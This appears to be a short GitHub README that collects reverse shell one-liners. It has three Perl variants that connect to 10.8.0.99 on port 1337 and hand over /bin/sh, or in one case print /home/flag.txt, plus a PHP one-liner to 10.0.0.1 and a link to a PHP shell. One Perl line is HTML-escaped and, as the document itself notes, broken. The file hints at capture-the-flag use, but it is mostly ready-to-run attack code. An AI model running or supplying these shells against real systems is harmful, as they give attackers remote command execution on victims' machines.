# ReverseShellScript (Not mine script)
Reverse Shell script : PERL , PHP , PYTHON
___
## PERL
ReverseShell.pl
```&gt;&amp;S``` is an encoded format that does not work in Perl or shell. (Its output will be sent out in HTML tags.)
```perl
perl -e 'use Socket;$i="10.8.0.99";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
```

ReverseShell2.pl
```>&S``` is the correct command to redirect data to socket ```S```.
```perl
perl -e 'use Socket;$i="10.8.0.99";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

ReverseShell3.pl
for BIND ReverseShell ;)
```perl
perl -e 'use Socket;$i="10.8.0.99";$p=1337;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))) {
    select(S); $|=1;
    print S "=== Connected ===\n";
    open(STDIN, ">&S"); open(STDOUT, ">&S"); open(STDERR, ">&S");
    system("cat /home/flag.txt");
};'
```
## PHP
ReverseShell.php

https://github.com/Sho2007/ReverseShellScript/blob/main/ReverseShell.php

ReverseShell2.php
```php
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```
